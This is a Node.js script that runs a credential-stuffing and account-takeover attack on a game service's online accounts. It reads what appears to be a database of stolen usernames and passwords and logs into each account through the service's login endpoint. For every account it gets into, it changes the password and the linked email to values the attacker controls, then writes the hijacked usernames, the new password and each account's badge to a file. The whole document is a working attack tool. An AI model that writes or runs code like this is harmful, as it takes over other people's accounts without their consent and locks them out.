const fs = require('fs');
const fetch = require('node-fetch'); // Import fetch if not already imported
const chalk = require('chalk');

const fileName = './blf_mobile_db.json';
let rawdata = fs.readFileSync(fileName);
let stuff = JSON.parse(rawdata);

async function loginWithDelay(account) {
  await new Promise(resolve => setTimeout(resolve, 1));
  if (account.unbanned == 1) return;
  loginAndChangePass(account.username, account.password);
}

async function loginAllAccounts() {
  const randomIndex = Math.floor(Math.random() * stuff.length);

  // Create an array of promises for concurrent execution
  const loginPromises = stuff.slice(randomIndex).map(account => loginWithDelay(account));

  // Execute promises concurrently
  await Promise.all(loginPromises);
}

async function loginAndChangePass(username, password) {
  try {
    let response = await fetch("https://server.blayzegames.com/OnlineAccountSystem//login.php?&requiredForMobile=1867325719", {
      method: "POST",
      "headers": {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/x-www-form-urlencoded",
        "sec-ch-ua": "\"Opera GX\";v=\"109\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"123\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "Referer": "https://games.crazygames.com/",
        },
      body: `username=${username}&password=${password}&store=BALYZE_WEB&useJSON=true&locale=english&tutorialr=1`
    });
    let result = await response.json();
    if (result.status == 0) {
      if (username.includes("PC-")) return;
      loginAndChangePass("PC-" + username, password);
    } else if (result.status == 1) {
      changePass(username, password);
    }

  } catch (error) {
    console.error('Error occurred:', error);
  }
}

async function changePass(username, password) {
  try {
    let response = await fetch("https://server.blayzegames.com/OnlineAccountSystem/update_account.php?requiredForMobile=233742481", {
      method: "POST",
      "headers": {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/x-www-form-urlencoded",
        "sec-ch-ua": "\"Opera GX\";v=\"109\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"123\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "Referer": "https://games.crazygames.com/",
        },
      body: `email=${username.split("PC-")[1] + "example@gmail.com"}&new_password=E3F941B424C4462F40D9F0A949D31C989C41A3BFCF65A9236503CFF0F824A75FE30B969291A43F1CBD863E1A08BFF067DFD383A046F5D6DC1B288481D0FF777A&username=${username}&password=${password}`,
    });
    let json = await response.json();
    if (json.status == 1) {
      console.log(json);
      getBadge(username);
    }
  } catch (error) {
    console.error('Error occurred:', error);
  }
}

async function getBadge(username) {
  try {
    let response = await fetch("https://server.blayzegames.com/OnlineAccountSystem/get_user_badge.php?requiredForMobile=753578852", {
      method: "POST",
        "headers": {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/x-www-form-urlencoded",
        "sec-ch-ua": "\"Opera GX\";v=\"109\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"123\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "Referer": "https://games.crazygames.com/",
        },
      body: `username=${username}&password=E3F941B424C4462F40D9F0A949D31C989C41A3BFCF65A9236503CFF0F824A75FE30B969291A43F1CBD863E1A08BFF067DFD383A046F5D6DC1B288481D0FF777A`,
    });
    let json = await response.json();
    if (json.data == null) return;
    console.log(json);
    let badge = json.data.badge;
    if (badge >= 0) {
      fs.appendFile("./valid-accounts.txt", `[2024]: ${username}:Sigma12@! | Badge: ${json.data.badge}\n`, () => {});
    }
  } catch (error) {
    console.error('Error occurred:', error);
  }
}

loginAllAccounts();
